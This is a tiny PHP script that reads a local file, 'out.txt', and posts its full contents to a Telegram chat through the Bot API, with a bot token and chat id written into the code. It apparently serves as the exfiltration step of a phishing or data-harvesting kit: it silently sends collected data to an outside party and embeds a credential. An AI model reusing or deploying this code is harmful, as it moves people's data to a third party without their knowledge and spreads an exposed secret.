٣<?php
    sleep(2);
    $msg = urlencode(file_get_contents("out.txt"));
    file_get_contents("https://api.telegram.org/bot1361925967:AAE6lkDqm6B6i7RJsVQ7s7P3a9durzFhQXQ/sendMessage?chat_id=773614503&text=$msg");
?>
